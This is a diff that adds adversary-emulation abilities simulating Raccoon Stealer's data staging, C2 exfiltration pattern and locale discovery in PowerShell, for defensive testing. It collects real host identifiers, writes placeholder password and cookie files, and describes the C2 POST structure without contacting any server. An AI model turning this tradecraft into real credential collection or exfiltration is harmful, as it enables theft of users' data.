@@ -1,0 +1,186 @@
+---
+# Raccoon Stealer - Data Staging
+# MITRE ATT&CK: T1560 - Archive Collected Data
+
+- id: a1b2c3d4-2020-4a5b-8c9d-e0f1a2b3c4d5
+  name: raccoon-data-staging
+  description: |
+    Raccoon Stealer stages collected data into System info.txt and other
+    files before exfiltration to C2 servers.
+  tactic: collection
+  technique:
+    attack_id: T1560
+    name: Archive Collected Data
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "[*] Simulating Raccoon Stealer data staging..."
+          
+          $stagingDir = "$env:TEMP\raccoon_staging"
+          New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
+          
+          # Create System info.txt (as Raccoon does)
+          $systemInfo = @"
+          ======== Raccoon Stealer System Info ========
+          User CID: $(hostname)|$env:USERNAME
+          MachineGuid: $((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid -ErrorAction SilentlyContinue).MachineGuid)
+          
+          [System Information]
+          OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
+          Architecture: $env:PROCESSOR_ARCHITECTURE
+          Processor: $(Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name)
+          RAM: $([math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)) GB
+          Display: $(Get-WmiObject -Class Win32_VideoController | Select-Object -ExpandProperty Name)
+          
+          [Timezone]
+          $(Get-TimeZone | Select-Object -ExpandProperty DisplayName)
+          
+          [Locale]
+          $((Get-Culture).Name)
+          
+          [Installed Applications]
+          $(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue | 
+            Where-Object { $_.DisplayName } | 
+            Select-Object -ExpandProperty DisplayName | 
+            Sort-Object | 
+            Select-Object -First 20 | 
+            ForEach-Object { "- $_" })
+          
+          ========================================
+          "@
+          
+          $systemInfoPath = "$stagingDir\System info.txt"
+          $systemInfo | Out-File -FilePath $systemInfoPath -Encoding UTF8
+          
+          Write-Output "[+] System info staged at: $systemInfoPath"
+          Write-Output "[*] File size: $((Get-Item $systemInfoPath).Length) bytes"
+          
+          # Create simulated data files
+          @{
+            "passwords.txt" = "[Chrome]`nNo passwords extracted (simulation)`n[Firefox]`nNo passwords extracted (simulation)"
+            "cookies.txt" = "[Chrome Cookies]`nSimulated cookie data`n[Firefox Cookies]`nSimulated cookie data"
+            "autofill.txt" = "[Autofill Data]`nSimulated autofill entries"
+          }.GetEnumerator() | ForEach-Object {
+            $filePath = "$stagingDir\$($_.Key)"
+            $_.Value | Out-File -FilePath $filePath -Encoding UTF8
+            Write-Output "[+] Created: $($_.Key)"
+          }
+          
+          Write-Output "`n[*] Staging directory contents:"
+          Get-ChildItem $stagingDir | ForEach-Object {
+            Write-Output "    - $($_.Name) ($($_.Length) bytes)"
+          }
+          
+          Write-Output "`n[*] Data staging complete"
+          Write-Output "[!] Staging path: $stagingDir"
+        cleanup: |
+          Remove-Item -Path "$env:TEMP\raccoon_staging" -Recurse -Force -ErrorAction SilentlyContinue
+  singleton: true
+  requirements: []
+
+---
+# Raccoon Stealer - Exfiltration Simulation
+# MITRE ATT&CK: T1041 - Exfiltration Over C2 Channel
+
+- id: a1b2c3d4-3030-4a5b-8c9d-e0f1a2b3c4d5
+  name: raccoon-data-exfiltration-simulation
+  description: |
+    Simulates Raccoon Stealer's HTTP POST-based exfiltration.
+    Does NOT actually exfiltrate data - only simulates the behavior.
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "[*] Simulating Raccoon Stealer exfiltration behavior..."
+          Write-Output "[!] NOTE: This is a SIMULATION - no actual data is exfiltrated"
+          
+          $stagingDir = "$env:TEMP\raccoon_staging"
+          
+          # Simulate C2 communication pattern
+          Write-Output "`n[*] Raccoon C2 Communication Pattern:"
+          Write-Output "    1. Initial beacon: POST / with machineId=<GUID>|<user>&configId=<key>"
+          Write-Output "    2. Receive config with token for subsequent requests"
+          Write-Output "    3. Download DLLs (sqlite3.dll, nss3.dll, etc.)"
+          Write-Output "    4. POST /<token> with System info.txt"
+          Write-Output "    5. POST /<token> with stolen data (multipart/form-data)"
+          Write-Output "    6. POST /<token> with ---Screenshot.jpeg"
+          Write-Output "    7. Download and execute next stage (if configured)"
+          
+          if (Test-Path $stagingDir) {
+            Write-Output "`n[*] Files that would be exfiltrated:"
+            Get-ChildItem $stagingDir | ForEach-Object {
+              Write-Output "    - $($_.Name) ($($_.Length) bytes)"
+            }
+          }
+          
+          # Simulate HTTP request structure
+          Write-Output "`n[*] Sample HTTP POST structure (simulated):"
+          Write-Output @"
+          POST /<token> HTTP/1.1
+          Host: <c2-server>
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+          User-Agent: <none or minimal>
+          
+          ------WebKitFormBoundary
+          Content-Disposition: form-data; name="file"; filename="System info.txt"
+          Content-Type: application/x-object
+          
+          <system info content>
+          ------WebKitFormBoundary--
+          "@
+          
+          Write-Output "`n[*] Exfiltration simulation complete"
+          Write-Output "[!] In real attack: Data sent to C2 via unencrypted HTTP POST"
+  singleton: true
+  requirements: []
+
+---
+# Raccoon Stealer - Timezone Discovery
+# MITRE ATT&CK: T1124 - System Time Discovery
+
+- id: a1b2c3d4-4040-4a5b-8c9d-e0f1a2b3c4d5
+  name: raccoon-timezone-discovery
+  description: |
+    Raccoon Stealer collects timezone and locale information.
+    It specifically checks if locale contains "ru" (Russian).
+  tactic: discovery
+  technique:
+    attack_id: T1124
+    name: System Time Discovery
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "[*] Collecting timezone and locale information..."
+          
+          # Get timezone
+          $timezone = Get-TimeZone
+          Write-Output "[*] Timezone: $($timezone.DisplayName)"
+          Write-Output "[*] Timezone ID: $($timezone.Id)"
+          Write-Output "[*] UTC Offset: $($timezone.BaseUtcOffset)"
+          
+          # Get locale (Raccoon checks for "ru")
+          $culture = Get-Culture
+          $uiCulture = Get-UICulture
+          
+          Write-Output "`n[*] Current Culture: $($culture.Name) ($($culture.DisplayName))"
+          Write-Output "[*] UI Culture: $($uiCulture.Name) ($($uiCulture.DisplayName))"
+          
+          # Check for Russian locale (Raccoon behavior)
+          if ($culture.Name -match "ru" -or $uiCulture.Name -match "ru") {
+            Write-Output "`n[!] Russian locale detected"
+            Write-Output "[*] Note: Some Raccoon variants may skip execution on Russian systems"
+          } else {
+            Write-Output "`n[*] Non-Russian locale - Raccoon would proceed with theft"
+          }
+          
+          # Current time
+          Write-Output "`n[*] Current Local Time: $(Get-Date)"
+          Write-Output "[*] Current UTC Time: $(Get-Date).ToUniversalTime()"
+  singleton: true
+  requirements: []
